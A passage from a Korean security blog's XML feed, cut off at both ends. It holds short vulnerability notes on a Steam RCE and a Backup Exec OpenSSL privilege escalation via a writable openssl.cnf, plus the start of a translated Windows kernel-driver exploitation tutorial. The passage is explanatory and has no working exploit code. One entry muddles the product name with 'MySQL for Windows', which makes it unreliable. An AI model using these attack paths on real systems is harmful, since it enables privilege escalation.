&#xD30C;&#xC77C; &#xC2A4;&#xD2B8;&#xB9BC;&#xC774; <code>0xFFFFFFFE</code>&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xBA74; <code>lufread</code>&#xC5D0;&#xC11C; &#xC5B8;&#xB354;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB418;&#xC5B4; offset&#xC744; &#xC190;&#xC0C1;&#xC2DC;&#xD0A8; &#xD6C4; ROP chain&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; POC&#xB294; <a href="https://github.com/floesen/CVE-2021-30481">github</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>steam</tag>
      
      <tag>idioth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-36167: OpenSSL Backup Exec Service 권한상승</title>
    <link href="/2021/04/21/fabu1ous/2021-04-21/"/>
    <url>/2021/04/21/fabu1ous/2021-04-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.veritas.com/content/support/en_US/security/VTS20-010">MySQL for Windows is vulnerable to privilege escalation due to OPENSSLDIR location</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MySQL for Windows Backup Exec BE 20.x, BE 21.x, 16.x</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>&#xC708;&#xB3C4;&#xC6B0;&#xC6A9; MySQL&#xC5D0;&#xB294; OPENSSLDIR &#xBCC0;&#xC218; &#xC0AC;&#xC6A9;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBD80;&#xD305; &#xC2DC; Backup Exec service&#xB294; OpenSSL &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xD574;&#xB2F9; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB294; <code>/usr/local/ssl/openssl.cnf</code> &#xB610;&#xB294; <code>C:\usr\local\ssl\openssl.cnf</code>&#xC758; &#xB85C;&#xB4DC;&#xB97C; &#xC2DC;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC758; &#xC77C;&#xBC18; &#xC720;&#xC800;&#xB77C;&#xB3C4; <code>C:\usr\local\ssl\</code>&#xC5D0; &#xC811;&#xADFC; &#xAD8C;&#xD55C;&#xC744; &#xAC16;&#xACE0; &#xC788;&#xC73C;&#xBA70; <code>opensll.cnf</code>&#xB97C; &#xC791;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; OpenSSL &#xC5D4;&#xC9C4;&#xC744; &#xAC00;&#xC7A5;&#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xAC00; &#xB85C;&#xB4DC;&#xB418;&#xC5B4; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xCEE4;&#xB294; &#xC704;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xB41C; &#xAD8C;&#xD55C;&#xC744; &#xD1B5;&#xD574; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0; &#xC124;&#xCE58;&#xB41C; &#xBAA8;&#xB4E0; &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>mysql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Exploiting System Mechanic Driver Part 1</title>
    <link href="/2021/04/21/l0ch/exploiting-driver/"/>
    <url>/2021/04/21/l0ch/exploiting-driver/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC911;&#xAC04;&#xACE0;&#xC0AC; &#xB9DD;&#xD55C; L0ch&#xC785;&#xB2C8;&#xB2E4;. &#xC544;&#xC9C1; 3&#xACFC;&#xBAA9;&#xC774;&#xB098; &#xB0A8;&#xC558;&#xC9C0;&#xB9CC; &#xB208;&#xC5D0; &#xB744;&#xB294; &#xAE00;&#xC774; &#xC788;&#xC5B4; &#xB9DD;&#xD55C; &#xAE40;&#xC5D0; &#xC2DC;&#xD5D8;&#xACF5;&#xBD80;&#xB294; &#xB358;&#xC9C0;&#xACE0; &#xBC88;&#xC5ED;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC778;&#xC0DD;..  </p><blockquote><p>&#xAD50;&#xC218;&#xB2D8; &#xC774;&#xC81C; &#xADF8;&#xB9CC; &#xC808; &#xB193;&#xC544;&#xC8FC;&#xC138;&#xC694;..</p></blockquote><p>&#xCEE4;&#xB110; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xAE30; &#xC27D;&#xAC8C; &#xC815;&#xB9AC;&#xD55C; &#xAE00;&#xC774; &#xC788;&#xC5B4;&#xC11C; &#xD30C;&#xD2B8; 2&#xB85C; &#xB098;&#xB220;&#xC11C; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD30C;&#xD2B8; 1&#xC5D0;&#xC11C;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xC18C;&#xAC1C;&#xC640; IOCTL, &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xD37C;&#xC9D5;&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC744; &#xB2E4;&#xB8E8;&#xBA70; &#xD30C;&#xD2B8; 2&#xC5D0;&#xC11C;&#xB294; &#xBCF8;&#xACA9;&#xC801;&#xC778; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCDE8;&#xC57D;&#xC810;&#xC758; root cause &#xBD84;&#xC11D;&#xACFC; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB8F9;&#xB2C8;&#xB2E4;!  </p><blockquote><p>&#xC6D0;&#xBB38; &#xAE00; : <a href="https://labs.yarix.com/2021/04/exploiting-system-mechanic-driver/">Exploiting System Mechanic Driver</a></p></blockquote><hr><p>&#xC9C0;&#xB09C;&#xB2EC; last&amp;VoidSec&#xC740; NULLCON&#xC5D0;&#xC11C; Ashfaq Ansari(@HackSysTeam)&#xC758; Windows Kernel Exploitation Advanced &#xACFC;&#xC815;&#xC744; &#xC218;&#xAC15;&#xD588;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC740; &#xD765;&#xBBF8;&#xB85C;&#xC6E0;&#xC73C;&#xBA70; core kernel &#xACF5;&#xAC04;&#xC758; &#xAC1C;&#xB150;&#xACFC; mitigation &#xC6B0;&#xD68C; &#xBC0F; exploit&#xC5D0; &#xB300;&#xD574; &#xB2E4;&#xB8E8;&#xC5C8;&#xB2E4;. &#xB9C8;&#xC9C0;&#xB9C9; &#xC2E4;&#xC2B5;&#xC778; <code>Write an exploit for System Mechanics</code> &#xC5D0;&#xC11C;&#xB294; &#xB354; &#xC774;&#xC0C1;&#xC758; &#xD78C;&#xD2B8;&#xB294; &#xC81C;&#xACF5;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA70; &#xC6B0;&#xB9AC;&#xB294; &#xC0C8;&#xB85C; &#xC2B5;&#xB4DD;&#xD55C; &#xC9C0;&#xC2DD;&#xACFC; &#xAD50;&#xC721; &#xC790;&#xB8CC;&#xC5D0; &#xB300;&#xD55C; &#xC774;&#xD574;&#xC640; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xC744; &#xD14C;&#xC2A4;&#xD2B8;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB3C4;&#xC804;&#xD588;&#xB2E4;. &#xC774; &#xC2E4;&#xC2B5;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC218;&#xD589;&#xD588;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; &#xC0AC;&#xC804; &#xC9C0;&#xC2DD; &#xC5C6;&#xC774; &#xC2E4;&#xC81C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xD65C;&#xC6A9;&#xD588;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xC790;&#xC138;&#xD788; &#xC54C;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><h1 id="Windows-drivers-101"><a href="#Windows-drivers-101" class="headerlink" title="Windows drivers 101"></a>Windows drivers 101</h1><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;&#xD558;&#xACE0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC804;&#xC5D0; &#xBA3C;&#xC800; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xBB34;&#xC5C7;&#xC774;&#xBA70; &#xC5B4;&#xB5BB;&#xAC8C; &#xC791;&#xB3D9;&#xD558;&#xB294;&#xC9C0; &#xC0B4;&#xD3B4;&#xBD10;&#xC57C; &#xD55C;&#xB2E4;. Windows&#xC5D0;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xC774;&#xBCA4;&#xD2B8;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xB54C; &#xCEE4;&#xB110; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xB85C;&#xB4DC; &#xAC00;&#xB2A5;&#xD55C; &#xBAA8;&#xB4C8;&#xB85C; &#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xBCA4;&#xD2B8;&#xB294; &#xC6B4;&#xC601;&#xCCB4;&#xC81C;&#xAC00; &#xC218;&#xD589;&#xD558;&#xB294; &#xC778;&#xD130;&#xB7FD;&#xD2B8; &#xB610;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC77C; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xCEE4;&#xB110;&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xC778;&#xD130;&#xB7FD;&#xD2B8;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xACE0; &#xC694;&#xCCAD;&#xC744; &#xC218;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC801;&#xC808;&#xD55C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB4DC;&#xB77C;&#xC774;&#xBC84; = &#xCEE4;&#xB110;&#xC758; DLL&#xC774;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xD0D0;&#xC0C9;&#xAE30;&#xC5D0;&#xC11C; &#xC2DC;&#xC2A4;&#xD15C; &#xD504;&#xB85C;&#xC138;&#xC2A4;(PID 4&#xAC00; &#xC788;&#xB294; &#xBAA8;&#xB4C8;) &#xB0B4;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8;&#xB85C; &#xB098;&#xC5F4;&#xB41C;&#xB2E4;.</p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled.png" alt="exploiting-driver/Untitled.png"></p><blockquote><p>PID 4(System Process)&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xBAA8;&#xB4C8;</p></blockquote><h2 id="Driver-Entry"><a href="#Driver-Entry" class="headerlink" title="Driver Entry"></a>Driver Entry</h2><p>&#xC774;&#xC81C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xCF54;&#xB4DC;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xB294; <code>DriverEntry</code>&#xB77C;&#xB294; &#xC77C;&#xC885;&#xC758; <code>main</code> &#xD568;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers">Microsoft &#xBB38;&#xC11C;</a>&#xC5D0; &#xC815;&#xC758;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS <span class="hljs-title">DriverEntry</span> <span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  _In_ PDRIVER_OBJECT DriverObject,</span></span><span class="hljs-function"><span class="hljs-params">  _In_ PUNICODE_STRING RegistryPath</span></span><span class="hljs-function"><span class="hljs-params">)</span> </span>;</code></pre><p>&#xC778;&#xC218; &#xC55E;&#xC758; <code>_In_</code> &#xC740; &#xC778;&#xC218;&#xAC00; <code>DriverEntry</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC785;&#xB825;&#xAC12;&#xC774;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xC774;&#xB2E4;. <code>DriverObject</code> &#xC778;&#xC218;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xBCF4;&#xC720;&#xD558;&#xB294; <code>DRIVER_OBJECT</code> &#xB370;&#xC774;&#xD130; &#xAD6C;&#xC870;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70; &#xC774;&#xD6C4;&#xC5D0; &#xB354; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xB2E4;. <code>RegistryPath</code> &#xC778;&#xC218;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC774;&#xBBF8;&#xC9C0;(&#xCEE4;&#xB110;&#xC774; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xCF54;&#xB4DC;&#xB97C; &#xB85C;&#xB4DC;&#xD558;&#xB294; <code>.sys</code> &#xD30C;&#xC77C;)&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xACBD;&#xB85C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; <code>UNICODE_STRING</code> &#xAD6C;&#xC870;&#xCCB4; (UTF-16 &#xBB38;&#xC790;&#xC5F4; &#xBC0F; &#xAE30;&#xD0C0; &#xC81C;&#xC5B4;&#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xCCB4;)&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xB2E4;.</p><h2 id="Devices-amp-Symlinks"><a href="#Devices-amp-Symlinks" class="headerlink" title="Devices &amp; Symlinks"></a>Devices &amp; Symlinks</h2><p>&#xC720;&#xC800; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC561;&#xC138;&#xC2A4; &#xD558;&#xB824;&#xBA74; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xD45C;&#xC900; &#xC720;&#xC800; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC7A5;&#xCE58;&#xC640; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;(a.k.a symlink)&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD55C;&#xB2E4;. &#xC7A5;&#xCE58;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC640; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC774;&#xBA70; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB294; <code>Win32</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB3D9;&#xC548; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC7A5;&#xCE58; &#xC774;&#xB984;(alias-&#xBCC4;&#xCE6D;)&#xC774;&#xB2E4;.</p><p>&#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC758; &#xC608;:  <code>C:\</code>&#xB294; &#xC800;&#xC7A5;&#xC7A5;&#xCE58;&#xB97C; &#xC704;&#xD55C; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC5D0; &#xBD88;&#xACFC;&#xD558;&#xB2E4;. <code>Sysinternals</code>&#xC758; <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/winobj">WinObj</a> &#xD234;&#xC744; &#xC0AC;&#xC6A9;&#xD574; root namespace &#xC544;&#xB798;&#xC758; <code>GLOBAL??</code>  &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; <code>C:</code>&#xB97C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB2E4;.  </p><p><img src="/2021/04/21/l0ch/exploiting-driver/Untitled%201.png" alt="exploiting-driver/Untitled%201.png"></p><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>IoCreateDevice</code> &#xBC0F; <code>IoCreateSymbolicLink</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC7A5;&#xCE58; &#xBC0F; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xB9CC;&#xB4E0;&#xB2E4;. &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1; &#xD560; &#xB54C; &#xC704; &#xB450; &#xD568;&#xC218;&#xAC00; &#xC5F0;&#xC18D;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xC774; &#xC7A5;&#xCE58;&#xC640; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xD654; &#xD558;&#xB294; &#xBD80;&#xBD84;&#xC778; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB300;&#xBD80;&#xBD84;&#xC758; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xD558;&#xB098;&#xC758; &#xC7A5;&#xCE58;&#xB9CC; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; &#xB300;&#xBD80;&#xBD84; &#xD55C; &#xBC88;&#xB9CC; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xC7A5;&#xCE58; &#xC774;&#xB984;&#xC740; <code>\Device\VulnerableDevice</code> &#xD615;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xBC18;&#xBA74; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB294; <code>\\.\VulnerableDeviceSymlink</code> &#xD615;&#xC2DD;&#xACFC; &#xC720;&#xC0AC;&#xD558;&#xB2E4;. &#xC774;&#xC81C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC758; &#x201C;frontend&#x201D;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD588;&#xC73C;&#xBBC0;&#xB85C; &#x201C;backend&#x201D;&#xC778; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xB2E4;.</p><h2 id="Dispatch-Routines"><a href="#Dispatch-Routines" class="headerlink" title="Dispatch Routines"></a>Dispatch Routines</h2><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xC791;&#xC5C5;(a.k.a &#xD568;&#xC218;/&#xB8E8;&#xD2F4;)&#xC744; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;. &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>WriteFile</code>, <code>ReadFile</code> &#xB610;&#xB294; <code>DeviceIoControl</code> API&#xAC00; &#xD574;&#xB2F9; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xB54C; &#xAC01;&#xAC01; &#xB2E4;&#xB974;&#xAC8C; &#xC791;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774; &#xB3D9;&#xC791;&#xC740; <code>DriverObject</code>&#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130; &#xBC30;&#xC5F4;&#xC778; <code>MajorFunctions</code>&#xBA64;&#xBC84;&#xB97C; &#xD1B5;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD55C;&#xB2E4;. <code>WriteFile</code>, <code>ReadFile</code> &#xB610;&#xB294; <code>DeviceIoControl</code>&#xACFC; &#xAC19;&#xC740; API&#xB294; <code>MajorFunctions</code> &#xB0B4;&#xC5D0; &#xD574;&#xB2F9; &#xC778;&#xB371;&#xC2A4;&#xAC00; &#xC788;&#xC5B4; &#xAD00;&#xB828; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xD638;&#xCD9C;&#xB41C;&#xB2E4;. &#xC77C;&#xBD80; &#xB9E4;&#xD06C;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAD00;&#xB828; &#xC778;&#xB371;&#xC2A4;&#xB97C; &#xAE30;&#xC5B5;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xB2E4;&#xC74C;&#xC740; &#xBA87; &#xAC00;&#xC9C0; &#xC608;&#xB2E4;.</p><ul><li><code>IRP_MJ_CREATE</code> : <code>CreateFile</code> &#xD638;&#xCD9C; &#xD6C4; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC778;&#xB371;&#xC2A4;</li><li><code>IRP_MJ_READ</code> : <code>ReadFile</code>&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC218;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC778;&#xB371;&#xC2A4;</li><li><code>IRP_MJ_DEVICE_CONTROL</code> : DeviceIoControl&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC778;&#xB371;&#xC2A4;</li></ul><p>&#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; <code>MyDriverRead</code> &#xB77C;&#xB294; &#xD568;&#xC218;&#xB97C; &#xC815;&#xC758;&#xD588;&#xC73C;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; <code>ReadFile</code> API&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xD638;&#xCD9C;&#xB418;&#xAE30;&#xB97C; &#xC6D0;&#xD55C;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBCF8;&#xB2E4;. <code>DriverEntry</code> &#xB0B4;&#xBD80; (&#xB610;&#xB294; &#xD638;&#xCD9C;&#xB41C; &#xD568;&#xC218;)&#xC5D0; &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB97C; &#xC791;&#xC131;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.</p><pre><code class="hljs cpp">DriverObject-&gt;MajorFunctions[IRP_MJ_READ] = MyDriverRead;</code></pre><p>&#xC774;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB294; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC758; &#xC774;&#xB984;&#xC744; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>MajorFunctions</code>&#xB294; &#xC81C;&#xD55C;&#xB41C; &#xD06C;&#xAE30;&#xC758; &#xBC30;&#xC5F4;&#xC774;&#xBBC0;&#xB85C; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xB9CE;&#xC740; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC744; &#xD560;&#xB2F9;&#xD558;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xC810;&#xC740; &#xC720;&#xC800; &#xBAA8;&#xB4DC; &#xD568;&#xC218; <code>DeviceIoControl</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC774;&#xC720;&#xAC00; &#xB41C;&#xB2E4;.</p><h2 id="DEVICEIOCONTROL-amp-IOCTL-Codes"><a href="#DEVICEIOCONTROL-amp-IOCTL-Codes" class="headerlink" title="DEVICEIOCONTROL &amp; IOCTL Codes"></a>DEVICEIOCONTROL &amp; IOCTL Codes</h2><p><code>IRP_MJ_DEVICE_CONTROL</code>&#xB85C; &#xC815;&#xC758;&#xB41C; <code>MajorFunctions</code> &#xB0B4;&#xC5D0;&#xB294; &#xD2B9;&#xC815; &#xC778;&#xB371;&#xC2A4;&#xAC00; &#xC788;&#xB2E4;. &#xC774; &#xC778;&#xB371;&#xC2A4;&#xC5D0;&#xB294; &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC7A5;&#xCE58;&#xC5D0;&#xC11C; <code>DeviceIoControl</code> API &#xD638;&#xCD9C; &#xD6C4; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xB514;&#xC2A4;&#xD328;&#xCE58; &#xB8E8;&#xD2F4;&#xC758; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC800;&#xC7A5;&#xB41C;&#xB2E4;. &#xC774; &#xD568;&#xC218;&#xB294; &#xC778;&#xC218; &#xC911; &#xD558;&#xB098;&#xAC00; IOCTL&#xB85C; &#xC54C;&#xB824;&#xC9C4; 32 &#xBE44;&#xD2B8; &#xC815;&#xC218;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD558;&#xB2E4;. &#xC774; I/O &#xCF54;&#xB4DC;&#xB294; 